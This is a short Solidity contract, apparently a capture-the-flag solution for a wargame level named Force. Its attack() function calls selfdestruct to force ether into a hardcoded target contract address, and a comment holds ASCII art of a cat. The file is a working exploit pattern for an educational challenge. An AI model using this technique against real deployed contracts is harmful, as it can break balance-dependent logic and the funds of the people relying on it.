// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Force.sol';
contract ForceHack {
    Force force = Force(address(0xa0bC2B8D96cEEae2F152709ea85083ef838A9700));

    function attack() public payable{
        address payable forcePayable = payable(address(force));
        selfdestruct(forcePayable);
    }
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}